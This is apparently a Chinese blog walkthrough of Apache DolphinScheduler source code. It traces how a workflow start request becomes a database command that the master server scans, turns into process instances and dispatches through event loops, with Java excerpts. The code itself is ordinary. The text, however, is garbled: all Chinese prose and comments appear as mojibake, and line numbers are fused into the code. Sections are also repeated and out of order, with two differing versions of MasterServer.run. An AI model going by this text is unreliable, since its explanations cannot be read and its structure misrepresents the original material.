executeType) &#123;/*** æŸ¥è¯¢é¡¹ç›®ä¿¡æ¯ **/ Project project = projectMapper.queryByCode(projectCode);//check user access for project/*** åˆ¤æ–­å½“å‰ç”¨æˆ·æ˜¯å¦æœ‰æ“ä½œæƒé™ **/ Map&lt;String, Object&gt; result = projectService.checkProjectAndAuth(loginUser, project, projectCode, ApiFuncIdentificationConstant.map.get(executeType)); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125;/*** æ£€æŸ¥MasterèŠ‚ç‚¹æ˜¯å¦å­˜åœ¨ **/ if (!checkMasterExists(result)) &#123; return result; &#125;/*** æŸ¥è¯¢å·¥ä½œæµå®ä¾‹è¯¦æƒ… **/ ProcessInstance processInstance = processService.findProcessInstanceDetailById(processInstanceId); if (processInstance == null) &#123; putMsg(result, Status.PROCESS_INSTANCE_NOT_EXIST, processInstanceId); return result; &#125;/*** æ ¹æ®å·¥ä½œæµå®ä¾‹ç»‘å®šçš„æµç¨‹å®šä¹‰IDæŸ¥è¯¢æµç¨‹å®šä¹‰ **/ ProcessDefinition processDefinition = processService.findProcessDefinition(processInstance.getProcessDefinitionCode(), processInstance.getProcessDefinitionVersion()); if (executeType != ExecuteType.STOP &amp;&amp; executeType != ExecuteType.PAUSE) &#123;/*** æ ¡éªŒå·¥ä½œæµå®šä¹‰èƒ½å¦æ‰§è¡Œï¼ˆå·¥ä½œæµæ˜¯å¦å­˜åœ¨ï¼Ÿæ˜¯å¦ä¸Šçº¿çŠ¶æ€ï¼Ÿå­˜åœ¨å­å·¥ä½œæµå®šä¹‰ä¸æ˜¯ä¸Šçº¿çŠ¶æ€ï¼Ÿï¼‰ **/ result = checkProcessDefinitionValid(projectCode, processDefinition, processInstance.getProcessDefinitionCode(), processInstance.getProcessDefinitionVersion()); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125; &#125;/*** æ ¹æ®å½“å‰å·¥ä½œæµå®ä¾‹çš„çŠ¶æ€åˆ¤æ–­èƒ½å¦æ‰§è¡Œå¯¹åº”executeTypeç±»å‹çš„æ“ä½œ **/ result = checkExecuteType(processInstance, executeType); if (result.get(Constants.STATUS) != Status.SUCCESS) &#123; return result; &#125;/*** åˆ¤æ–­æ˜¯å¦å·²ç»é€‰æ‹©äº†åˆé€‚çš„ç§Ÿæˆ· **/ if (!checkTenantSuitable(processDefinition)) &#123; logger.error(&quot;there is not any valid tenant for the process definition: id:&#123;&#125;,name:&#123;&#125;, &quot;, processDefinition.getId(), processDefinition.getName()); putMsg(result, Status.TENANT_NOT_SUITABLE); &#125;/*** åœ¨executeTypeä¸ºé‡è·‘çš„çŠ¶æ€ä¸‹ï¼Œè·å–ç”¨æˆ·æŒ‡å®šçš„å¯åŠ¨å‚æ•° **/ Map&lt;String, Object&gt; commandMap = JSONUtils.parseObject(processInstance.getCommandParam(), new TypeReference&lt;Map&lt;String, Object&gt;&gt;() &#123; &#125;); String startParams = null; if (MapUtils.isNotEmpty(commandMap) &amp;&amp; executeType == ExecuteType.REPEAT_RUNNING) &#123; Object startParamsJson = commandMap.get(Constants.CMD_PARAM_START_PARAMS); if (startParamsJson != null) &#123; startParams = startParamsJson.toString(); &#125; &#125;/*** æ ¹æ®ä¸åŒçš„ExecuteTypeå»æ‰§è¡Œç›¸åº”çš„æ“ä½œ **/ switch (executeType) &#123; case REPEAT_RUNNING:// é‡è·‘ result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.REPEAT_RUNNING, startParams); break; case RECOVER_SUSPENDED_PROCESS:// æ¢å¤æŒ‚è½½çš„å·¥ä½œæµ result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.RECOVER_SUSPENDED_PROCESS, startParams); break; case START_FAILURE_TASK_PROCESS:// å¯åŠ¨å¤±è´¥çš„å·¥ä½œæµ result = insertCommand(loginUser, processInstanceId, processDefinition.getCode(), processDefinition.getVersion(), CommandType.START_FAILURE_TASK_PROCESS, startParams); break; case STOP:// åœæ­¢ if (processInstance.getState() == ExecutionStatus.READY_STOP) &#123; putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState()); &#125; else &#123; result = updateProcessInstancePrepare(processInstance, CommandType.STOP, ExecutionStatus.READY_STOP); &#125; break; case PAUSE:// æš‚åœ if (processInstance.getState() == ExecutionStatus.READY_PAUSE) &#123; putMsg(result, Status.PROCESS_INSTANCE_ALREADY_CHANGED, processInstance.getName(), processInstance.getState()); &#125; else &#123; result = updateProcessInstancePrepare(processInstance, CommandType.PAUSE, ExecutionStatus.READY_PAUSE); &#125; break; default: logger.error(&quot;unknown execute type : &#123;&#125;&quot;, executeType); putMsg(result, Status.REQUEST_PARAMS_NOT_VALID_ERROR, &quot;unknown execute type&quot;); break; &#125; return result;&#125; å¯ä»¥çœ‹åˆ°ï¼Œä»¥ä¸Šä»£ç å‰åŠéƒ¨åˆ†ä¸»è¦æ˜¯åšäº†æ ¡éªŒçš„æ“ä½œï¼ŒååŠéƒ¨åˆ†æ˜¯æ ¹æ®æ‰§è¡Œç±»å‹æ¥åšä¸åŒçš„æ“ä½œï¼Œæ“ä½œä¸»è¦åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šinsertCommandä»¥åŠupdateProcessInstancePrepareã€‚ executeæ‰§è¡Œæ¥å£åˆ†æ 3.2.1 insertCommand DS æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼Œå…¶å®ä¸»è¦å°±æ˜¯æŠŠç”Ÿæˆå‘½ä»¤å¹¶æ’å…¥t_ds_commandï¼ˆæ‰§è¡Œå‘½ä»¤è¡¨ï¼‰ï¼Œæ’å…¥å·²ç»æ·»åŠ å¥½æ³¨é‡Šï¼š 12345678910111213141516171819202122232425262728293031323334353637383940414243444546/** * æ’å…¥å‘½ä»¤ï¼ˆre run, recovery (pause / failure) execution) * * @param loginUser ç™»å½•ç”¨æˆ· * @param instanceId å·¥ä½œæµå®ä¾‹id * @param processDefinitionCode å·¥ä½œæµå®šä¹‰id * @param processVersion å·¥ä½œæµç‰ˆæœ¬ * @param commandType å‘½ä»¤ç±»å‹ * @return æ“ä½œç»“æœ */private Map&lt;String, Object&gt; insertCommand(User loginUser, Integer instanceId, long processDefinitionCode, int processVersion, CommandType commandType, String startParams) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;();/*** å°è£…å¯åŠ¨å‚æ•° **/ Map&lt;String, Object&gt; cmdParam = new HashMap&lt;&gt;(); cmdParam.put(CMD_PARAM_RECOVER_PROCESS_ID_STRING, instanceId); if (!StringUtils.isEmpty(startParams)) &#123; cmdParam.put(CMD_PARAM_START_PARAMS, startParams); &#125; Command command = new Command(); command.setCommandType(commandType); command.setProcessDefinitionCode(processDefinitionCode); command.setCommandParam(JSONUtils.toJsonString(cmdParam)); command.setExecutorId(loginUser.getId()); command.setProcessDefinitionVersion(processVersion); command.setProcessInstanceId(instanceId);/*** åˆ¤æ–­å·¥ä½œæµå®ä¾‹æ˜¯å¦æ­£åœ¨æ‰§è¡Œ **/ if (!processService.verifyIsNeedCreateCommand(command)) &#123; putMsg(result, Status.PROCESS_INSTANCE_EXECUTING_COMMAND, String.valueOf(processDefinitionCode)); return result; &#125;/*** ä¿å­˜å‘½ä»¤ **/ int create = processService.createCommand(command); if (create &gt; 0) &#123; putMsg(result, Status.SUCCESS); &#125; else &#123; putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR); &#125; return result;&#125; 3.2.2 updateProcessInstancePrepare DS æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼Œå·²ç»æ·»åŠ æ³¨é‡Š 123456789101112131415161718192021222324252627282930/** * å‡†å¤‡æ›´æ–°å·¥ä½œæµå®ä¾‹çš„å‘½ä»¤ç±»å‹å’ŒçŠ¶æ€ * * @param processInstance å·¥ä½œæµå®ä¾‹ * @param commandType å‘½ä»¤ç±»å‹ * @param executionStatus æ‰§è¡ŒçŠ¶æ€ * @return æ›´æ–°ç»“æœ */private Map&lt;String, Object&gt; updateProcessInstancePrepare(ProcessInstance processInstance, CommandType commandType, ExecutionStatus executionStatus) &#123; Map&lt;String, Object&gt; result = new HashMap&lt;&gt;(); processInstance.setCommandType(commandType); processInstance.addHistoryCmd(commandType); processInstance.setState(executionStatus); int update = processService.updateProcessInstance(processInstance);// åˆ¤æ–­æµç¨‹æ˜¯å¦æ­£å¸¸ if (update &gt; 0) &#123; StateEventChangeCommand stateEventChangeCommand = new StateEventChangeCommand( processInstance.getId(), 0, processInstance.getState(), processInstance.getId(), 0 ); Host host = new Host(processInstance.getHost()); stateEventCallbackService.sendResult(host, stateEventChangeCommand.convert2Command()); putMsg(result, Status.SUCCESS); &#125; else &#123; putMsg(result, Status.EXECUTE_PROCESS_INSTANCE_ERROR); &#125; return result;&#125; æ ¹æ®æµç¨‹å›¾ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°äº†å·²ç»æ‰§è¡Œäº†å¦‚ä¸‹çº¢æ¡†çš„ä»£ç ï¼Œä¹Ÿå°±æ˜¯æŠŠæˆ‘ä»¬çš„commandå·²ç»ç¼“å­˜åˆ°äº†DBã€‚ æ¥ä¸‹æ¥éœ€è¦çœ‹çœ‹Masterçš„ä»£ç ã€‚ 3.3 MasterServer DS 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111@SpringBootApplication@ComponentScan(&quot;org.apache.dolphinscheduler&quot;)@EnableTransactionManagement@EnableCachingpublic class MasterServer implements IStoppable &#123; private static final Logger logger = LoggerFactory.getLogger(MasterServer.class); @Autowired private SpringApplicationContext springApplicationContext; @Autowired private MasterRegistryClient masterRegistryClient; @Autowired private TaskPluginManager taskPluginManager; @Autowired private MasterSchedulerService masterSchedulerService; @Autowired private SchedulerApi schedulerApi; @Autowired private EventExecuteService eventExecuteService; @Autowired private FailoverExecuteThread failoverExecuteThread; @Autowired private MasterRPCServer masterRPCServer; public static void main(String[] args) &#123; Thread.currentThread().setName(Constants.THREAD_NAME_MASTER_SERVER); SpringApplication.run(MasterServer.class); &#125;/** * å¯åŠ¨ master server */ @PostConstruct public void run() throws SchedulerException &#123;// åˆå§‹åŒ– RPCæœåŠ¡ this.masterRPCServer.start();//å®‰è£…ä»»åŠ¡æ’ä»¶ this.taskPluginManager.installPlugin();/*** MasterServer æ³¨å†Œå®¢æˆ·ç«¯ï¼Œç”¨äºè¿æ¥åˆ°æ³¨å†Œè¡¨å¹¶ä¼ é€’æ³¨å†Œè¡¨äº‹ä»¶ã€‚ * å½“ä¸»èŠ‚ç‚¹å¯åŠ¨æ—¶ï¼Œå®ƒå°†åœ¨æ³¨å†Œä¸­å¿ƒæ³¨å†Œ,å¹¶è°ƒåº¦ä¸€ä¸ª&#123;@link HeartBeatTask&#125;æ¥æ›´æ–°æ³¨å†Œè¡¨ä¸­çš„å…ƒæ•°æ®**/ this.masterRegistryClient.init(); this.masterRegistryClient.start(); this.masterRegistryClient.setRegistryStoppable(this);// ä¸»è°ƒåº¦ç¨‹åºçº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹å°†ä½¿ç”¨æ¥è‡ªæ•°æ®åº“çš„å‘½ä»¤å¹¶è§¦å‘æ‰§è¡Œçš„processInstanceã€‚ this.masterSchedulerService.init(); this.masterSchedulerService.start(); this.eventExecuteService.start(); this.failoverExecuteThread.start();//è¿™æ˜¯è°ƒåº¦å™¨çš„æ¥å£ï¼ŒåŒ…å«æ“ä½œè°ƒåº¦ä»»åŠ¡çš„æ–¹æ³•ã€‚ this.schedulerApi.start(); Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; &#123; if (Stopper.isRunning()) &#123; close(&quot;MasterServer shutdownHook&quot;); &#125; &#125;)); &#125;/** * ä¼˜é›…çš„å…³é—­æ–¹æ³• * * @param cause å…³é—­çš„åŸå›  */ public void close(String cause) &#123; try &#123;// set stop signal is true// execute only once if (!Stopper.stop()) &#123; logger.warn(&quot;MasterServer is already stopped, current cause: &#123;&#125;&quot;, cause); return; &#125; logger.info(&quot;Master server is stopping, current cause : &#123;&#125;&quot;, cause);// thread sleep 3 seconds for thread quietly stop ThreadUtils.sleep(Constants.SERVER_CLOSE_WAIT_TIME.toMillis());// close this.schedulerApi.close(); this.masterSchedulerService.close(); this.masterRPCServer.close(); this.masterRegistryClient.closeRegistry();// close spring Context and will invoke method with @PreDestroy annotation to destroy beans.// like ServerNodeManager,HostManager,TaskResponseService,CuratorZookeeperClient,etc springApplicationContext.close(); logger.info(&quot;MasterServer stopped, current cause: &#123;&#125;&quot;, cause); &#125; catch (Exception e) &#123; logger.error(&quot;MasterServer stop failed, current cause: &#123;&#125;&quot;, cause, e); &#125; &#125; @Override public void stop(String cause) &#123; close(cause); &#125;&#125; åœ¨runæ–¹æ³•é‡Œé¢ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œä¸»è¦ä¾æ¬¡æ‰§è¡Œäº†ï¼š **â‘  MasterRPCServer.start()**ï¼šå¯åŠ¨masterçš„rpcæœåŠ¡ï¼› **â‘¡ TaskPluginManager.installPlugin()**ï¼šå®‰è£…ä»»åŠ¡æ’ä»¶ï¼› **â‘¢ MasterRegistryClient.start()**ï¼šå‘Zookeeperæ³¨å†ŒMasterServerï¼› **â‘£ MasterSchedulerService.start()**ï¼šä¸»è°ƒåº¦ç¨‹åºçº¿ç¨‹ï¼Œè¯¥çº¿ç¨‹å°†ä½¿ç”¨æ¥è‡ªæ•°æ®åº“çš„å‘½ä»¤å¹¶è§¦å‘æ‰§è¡Œçš„processInstanceã€‚ **â‘¤ EventExecuteService.start()**ï¼šå·¥ä½œæµå®ä¾‹æ‰§è¡Œæƒ…å†µ **â‘¥ FailoverExecuteThread()**ï¼šæ•…éšœè½¬ç§»æ£€æµ‹ **â‘¦ SchedulerApi.start()**ï¼šscheduleræ¥å£å»æ“ä½œä»»åŠ¡å®ä¾‹ 3.1.1 MasterRPCServer DS Master RPC Serverä¸»è¦ç”¨æ¥å‘é€æˆ–æ¥æ”¶è¯·æ±‚ç»™å…¶å®ƒç³»ç»Ÿã€‚ åˆå§‹åŒ–æ–¹æ³•å¦‚ä¸‹ï¼š 1234567891011121314151617181920212223@PostConstructprivate void init() &#123;// åˆå§‹åŒ–è¿œç¨‹æœåŠ¡ NettyServerConfig serverConfig = new NettyServerConfig(); serverConfig.setListenPort(masterConfig.getListenPort()); this.nettyRemotingServer = new NettyRemotingServer(serverConfig); this.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RESPONSE, taskExecuteResponseProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_EXECUTE_RUNNING, taskExecuteRunningProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_KILL_RESPONSE, taskKillResponseProcessor); this.nettyRemotingServer.registerProcessor(CommandType.STATE_EVENT_REQUEST, stateEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_FORCE_STATE_EVENT_REQUEST, taskEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_WAKEUP_EVENT_REQUEST, taskEventProcessor); this.nettyRemotingServer.registerProcessor(CommandType.CACHE_EXPIRE, cacheProcessor); this.nettyRemotingServer.registerProcessor(CommandType.TASK_RECALL, taskRecallProcessor);// æ—¥å¿—æœåŠ¡ this.nettyRemotingServer.registerProcessor(CommandType.GET_LOG_BYTES_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.ROLL_VIEW_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.VIEW_WHOLE_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.registerProcessor(CommandType.REMOVE_TAK_LOG_REQUEST, loggerRequestProcessor); this.nettyRemotingServer.start();&#125; 3.2.2 TaskPluginManager DS åˆ°æ­¤éƒ¨åˆ†æºç è§£æå®Œæˆæ•´ä½“æµç¨‹è¿è¡Œ ç”¨æˆ·ç‚¹å‡»WEBç•Œé¢çš„å¯åŠ¨å·¥ä½œæµæŒ‰é’®ã€‚ apiserver å°è£… commnd åˆ° dbï¼ˆå¾€ t_ds_command è¡¨ä¸­æ’å…¥ä¸€æ¡æ•°æ®ï¼‰ã€‚ master æ‰«æåˆ° commadï¼Œè¿›è¡Œ dga æ„å»ºï¼Œåˆå§‹åŒ–ï¼Œå°†æºå¤´ task æäº¤åˆ° priority é˜Ÿåˆ—ä¸­ã€‚ taskConsumer æ¶ˆè´¹é˜Ÿåˆ—æ•°æ®å¾—åˆ° taskï¼Œé€‰æ‹©ä¸€å° worker åˆ†é…ä»»åŠ¡ã€‚ worker æ¥æ”¶åˆ°åˆ†é…ä»»åŠ¡çš„æ¶ˆæ¯å¯åŠ¨ä»»åŠ¡ã€‚ worker è¿”å›ç»“æœç»™ masterï¼Œmaster æ›´æ–°ä»»åŠ¡ä¿¡æ¯åˆ° db ã€‚ 03 DolphinScheduleræºç å‰–æ 3.1 apiserverä»»åŠ¡æ‰§è¡Œå…¥å£ å½“ç”¨æˆ·åœ¨å‰ç«¯ç‚¹å‡»æ‰§è¡Œä»»åŠ¡ï¼Œåˆ™ä¼šå‘æµ·è±šè°ƒåº¦çš„æ¥å£å‘é€è¯·æ±‚ï¼Œæœ€ç»ˆç”± ExecutorController çš„ startProcessInstance æ–¹æ³•æ¥å¤„ç†è¯·æ±‚ã€‚ ExecutorController.startProcessInstance() æ–¹æ³•ã€‚ æœ€ç»ˆä¼šå¾€ mysql è¡¨ t_ds_command æ’å…¥ä¸€æ¡æ•°æ®ï¼Œå°†è¦è¿è¡Œçš„å·¥ä½œæµä¿¡æ¯å†™å…¥è¯¥è¡¨ã€‚ 1234567891011121314151617181920212223242526272829303132333435363738394041424344@PostMapping(value = &quot;start-process-instance&quot;)@ResponseStatus(HttpStatus.OK)@ApiException(START_PROCESS_INSTANCE_ERROR)@AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;)public Result startProcessInstance(@ApiIgnore @RequestAttribute(value = Constants.SESSION_USER) User loginUser, @ApiParam(name = &quot;projectCode&quot;, value = &quot;PROJECT_CODE&quot;, required = true) @PathVariable long projectCode, @RequestParam(value = &quot;processDefinitionCode&quot;) long processDefinitionCode, @RequestParam(value = &quot;scheduleTime&quot;) String scheduleTime, @RequestParam(value = &quot;failureStrategy&quot;) FailureStrategy failureStrategy, @RequestParam(value = &quot;startNodeList&quot;, required = false) String startNodeList, @RequestParam(value = &quot;taskDependType&quot;, required = false) TaskDependType taskDependType, @RequestParam(value = &quot;execType&quot;, required = false) CommandType execType, @RequestParam(value = &quot;warningType&quot;) WarningType warningType, @RequestParam(value = &quot;warningGroupId&quot;, required = false, defaultValue = &quot;0&quot;) Integer warningGroupId, @RequestParam(value = &quot;runMode&quot;, required = false) RunMode runMode, @RequestParam(value = &quot;processInstancePriority&quot;, required = false) Priority processInstancePriority, @RequestParam(value = &quot;workerGroup&quot;, required = false, defaultValue = &quot;default&quot;) String workerGroup, @RequestParam(value = &quot;environmentCode&quot;, required = false, defaultValue = &quot;-1&quot;) Long environmentCode, @RequestParam(value = &quot;timeout&quot;, required = false) Integer timeout, @RequestParam(value = &quot;startParams&quot;, required = false) String startParams, @RequestParam(value = &quot;expectedParallelismNumber&quot;, required = false) Integer expectedParallelismNumber, @RequestParam(value = &quot;dryRun&quot;, defaultValue = &quot;0&quot;, required = false) int dryRun, @RequestParam(value = &quot;complementDependentMode&quot;, required = false) ComplementDependentMode complementDependentMode) &#123; if (timeout == null) &#123; timeout = Constants.MAX_TASK_TIMEOUT; &#125; Map&lt;String, String&gt; startParamMap = null; if (startParams != null) &#123; startParamMap = JSONUtils.toMap(startParams); &#125; if (complementDependentMode == null) &#123; complementDependentMode = ComplementDependentMode.OFF_MODE; &#125; //ç”Ÿæˆcommndä¿¡æ¯å…¥åº“ Map&lt;String, Object&gt; result = execService.execProcessInstance(loginUser, projectCode, processDefinitionCode, scheduleTime, execType, failureStrategy, startNodeList, taskDependType, warningType, warningGroupId, runMode, processInstancePriority, workerGroup, environmentCode, timeout, startParamMap, expectedParallelismNumber, dryRun, complementDependentMode); return returnDataList(result);&#125; 3.2 master è°ƒåº¦ä»»åŠ¡ 3.2.1 masterå¯åŠ¨ DS MasterServer.run() æ–¹æ³• å¯åŠ¨ master çš„å·¥ä½œçº¿ç¨‹ 12345678910111213141516171819202122232425public void run() throws SchedulerException &#123;// init rpc serverthis.masterRPCServer.start();//å¯åŠ¨netty rpcæœåŠ¡ï¼Œä¸workeré€šä¿¡ä½¿ç”¨// install task pluginthis.taskPluginManager.loadPlugin();//åŠ è½½taskplugin// self tolerantthis.masterRegistryClient.init();//åŠ è½½é«˜å¯ç”¨çš„ä¸€äº›æ³¨å†Œä¿¡æ¯this.masterRegistryClient.start();this.masterRegistryClient.setRegistryStoppable(this);//commandæ‰«æçº¿ç¨‹this.masterSchedulerBootstrap.init();this.masterSchedulerBootstrap.start();//äº‹ä»¶å¤„ç†çº¿ç¨‹this.eventExecuteService.start();this.failoverExecuteThread.start();//å®šæ—¶è°ƒåº¦this.schedulerApi.start();Runtime.getRuntime().addShutdownHook(new Thread(() -&gt; &#123; if (Stopper.isRunning()) &#123; close(&quot;MasterServer shutdownHook&quot;); &#125;&#125;));&#125; 3.2.2 commandæ‰«æ DS MasterSchedulerBootstrap.run()æ–¹æ³• è¯¥çº¿ç¨‹åœ¨3.2.1å¯åŠ¨ï¼Œå¯åŠ¨ä¹‹åï¼Œè¿›å…¥å¾ªç¯ï¼Œä¸€ç›´æ‰«æ command è¡¨ï¼ŒæŸ¥è¯¢å‡º commandï¼Œç„¶åå°è£…æˆ processInstants å…¥åº“ï¼Œåˆ›å»º WorkflowExecuteRunnable (æ­¤å¯¹è±¡åç»­å¾ˆå¤šåœ°æ–¹ç”¨åˆ°) å†™å…¥åˆ° workflowEventQueue ä¸­ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758public void run() &#123; while (Stopper.isRunning()) &#123; try &#123; // todo: if the workflow event queue is much, we need to handle the back pressure boolean isOverload = OSUtils.isOverload(masterConfig.getMaxCpuLoadAvg(), masterConfig.getReservedMemory()); if (isOverload) &#123; MasterServerMetrics.incMasterOverload(); Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; List&lt;Command&gt; commands = findCommands(); if (CollectionUtils.isEmpty(commands)) &#123; // indicate that no command ,sleep for 1s Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; //å°†commandè½¬æ¢æˆprocessInstance,å¹¶å…¥åº“ List&lt;ProcessInstance&gt; processInstances = command2ProcessInstance(commands); if (CollectionUtils.isEmpty(processInstances)) &#123; // indicate that the command transform to processInstance error, sleep for 1s Thread.sleep(Constants.SLEEP_TIME_MILLIS); continue; &#125; MasterServerMetrics.incMasterConsumeCommand(commands.size()); processInstances.forEach(processInstance -&gt; &#123; try &#123; LoggerUtils.setWorkflowInstanceIdMDC(processInstance.getId()); if (processInstanceExecCacheManager.contains(processInstance.getId())) &#123; logger.error(&quot;The workflow instance is already been cached, this case shouldn&#x27;t be happened&quot;); &#125; WorkflowExecuteRunnable workflowRunnable = new WorkflowExecuteRunnable(processInstance, processService, nettyExecutorManager, processAlertManager, masterConfig, stateWheelExecuteThread, curingGlobalParamsService); processInstanceExecCacheManager.cache(processInstance.getId(), workflowRunnable);//processInstanceExecCacheManagerè®¾ç½®è¿›cache è¢« workflowEventLoopè·å– workflowEventQueue.addEvent(new WorkflowEvent(WorkflowEventType.START_WORKFLOW, processInstance.getId())); &#125; finally &#123; LoggerUtils.removeWorkflowInstanceIdMDC(); &#125; &#125;); &#125; catch (InterruptedException interruptedException) &#123; logger.warn(&quot;Master schedule bootstrap interrupted, close the loop&quot;, interruptedException); Thread.currentThread().interrupt(); break; &#125; catch (Exception e) &#123; logger.error(&quot;Master schedule workflow error&quot;, e); // sleep for 1s here to avoid the database down cause the exception boom ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; &#125;&#125; }3.2.3 workerFlowEventæ¶ˆè´¹ DS åœ¨ command æ‰«æçº¿ç¨‹ä¸­å¯åŠ¨äº† workflowEventLooper çº¿ç¨‹ç”¨äºæ¶ˆè´¹ workerFlowEvent ã€‚ MasterSchedulerBootstrap.start() æ–¹æ³• 1234567@Overridepublic synchronized void start() &#123; logger.info(&quot;Master schedule bootstrap starting..&quot;); super.start(); workflowEventLooper.start();//å·¥ä½œæµè°ƒåº¦çº¿ç¨‹å¯åŠ¨ logger.info(&quot;Master schedule bootstrap started...&quot;);&#125; ä»workflowEventQueue æ‹‰å– workflowevent äº‹ä»¶ï¼Œè°ƒç”¨ workflowEventHandler å¤„ç†è¯¥äº‹ä»¶ã€‚ WorkflowEventLooper.run()æ–¹æ³• 12345678910111213141516171819202122232425262728293031323334public void run() &#123; WorkflowEvent workflowEvent = null; while (Stopper.isRunning()) &#123; try &#123; workflowEvent = workflowEventQueue.poolEvent();//æ‹‰å–workflowevent LoggerUtils.setWorkflowInstanceIdMDC(workflowEvent.getWorkflowInstanceId()); logger.info(&quot;Workflow event looper receive a workflow event: &#123;&#125;, will handle this&quot;, workflowEvent); WorkflowEventHandler workflowEventHandler = workflowEventHandlerMap.get(workflowEvent.getWorkflowEventType());//è·å–workfloweventï¼Œå¤„ç†workfloweventäº‹ä»¶ workflowEventHandler.handleWorkflowEvent(workflowEvent); &#125; catch (InterruptedException e) &#123; logger.warn(&quot;WorkflowEventLooper thread is interrupted, will close this loop&quot;, e); Thread.currentThread().interrupt(); break; &#125; catch (WorkflowEventHandleException workflowEventHandleException) &#123; logger.error(&quot;Handle workflow event failed, will add this event to event queue again, event: &#123;&#125;&quot;, workflowEvent, workflowEventHandleException); workflowEventQueue.addEvent(workflowEvent); ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; catch (WorkflowEventHandleError workflowEventHandleError) &#123; logger.error(&quot;Handle workflow event error, will drop this event, event: &#123;&#125;&quot;, workflowEvent, workflowEventHandleError); &#125; catch (Exception unknownException) &#123; logger.error( &quot;Handle workflow event failed, get a unknown exception, will add this event to event queue again, event: &#123;&#125;&quot;, workflowEvent, unknownException); workflowEventQueue.addEvent(workflowEvent); ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS); &#125; finally &#123; LoggerUtils.removeWorkflowInstanceIdMDC(); &#125; &#125;&#125; 3.2.4 workerflowäº‹ä»¶å¤„ç†é€»è¾‘ DS å› ä¸ºæ˜¯START_WORKFLOWç±»å‹çš„æ‰€ä»¥è·å–åˆ° WorkflowStartEventHandler.handleWorkflowEvent() æ¥å¤„ç†è¯¥äº‹ä»¶ã€‚ è¯¥æ–¹æ³•ä¸­ï¼Œè·å– WorkflowExecuteRunnable ï¼Œè¿è¡Œå¼‚æ­¥ä»»åŠ¡è°ƒç”¨ call æ–¹æ³•ã€‚ 1234567891011121314151617181920212223242526272829303132@Overridepublic void handleWorkflowEvent(WorkflowEvent workflowEvent) throws WorkflowEventHandleError &#123; logger.info(&quot;Handle workflow start event, begin to start a workflow, event: &#123;&#125;&quot;, workflowEvent);//è·å–WorkflowExecuteRunnable WorkflowExecuteRunnable workflowExecuteRunnable = processInstanceExecCacheManager.getByProcessInstanceId(workflowEvent.getWorkflowInstanceId()); if (workflowExecuteRunnable == null) &#123; throw new WorkflowEventHandleError( &quot;The workflow start event is invalid, cannot find the workflow instance from cache&quot;); &#125; ProcessInstance processInstance = workflowExecuteRunnable.getProcessInstance(); ProcessInstanceMetrics.incProcessInstanceSubmit(); //å¼‚æ­¥è°ƒç”¨callæ–¹æ³•æ‰§è¡ŒworkflowExecuteè¿è¡Œé€»è¾‘ã€‚ CompletableFuture&lt;WorkflowSubmitStatue&gt; workflowSubmitFuture = CompletableFuture.supplyAsync(workflowExecuteRunnable::call, workflowExecuteThreadPool); workflowSubmitFuture.thenAccept(workflowSubmitStatue -&gt; &#123; if (WorkflowSubmitStatue.SUCCESS == workflowSubmitStatue) &#123; // submit failed will resend the event to workflow event queue logger.info(&quot;Success submit the workflow instance&quot;);//ç›‘å¬è¿”å›çŠ¶æ€æ˜¯å¦æˆåŠŸ if (processInstance.getTimeout() &gt; 0) &#123;//æ˜¯å¦è¶…æ—¶ stateWheelExecuteThread.addProcess4TimeoutCheck(processInstance); &#125; &#125; else &#123;//å‡ºç°å¼‚å¸¸ï¼Œé‡è¯•ï¼Œé‡æ–°è¿›å…¥é˜Ÿåˆ—ï¼Œè°ƒç”¨callæ–¹æ³• logger.error(&quot;Failed to submit the workflow instance, will resend the workflow start event: &#123;&#125;&quot;, workflowEvent); workflowEventQueue.addEvent(new WorkflowEvent(WorkflowEventType.START_WORKFLOW, processInstance.getId())); &#125; &#125;);&#125; 3.2.5 workerflowRunnableè¿è¡Œé€»è¾‘ DS WorkflowExecuteRunnable.call() åˆå§‹åŒ–workerflowçš„æœ‰å‘æ— ç¯å›¾ã€‚ åˆå§‹åŒ–ä»»åŠ¡è°ƒåº¦é…ç½® 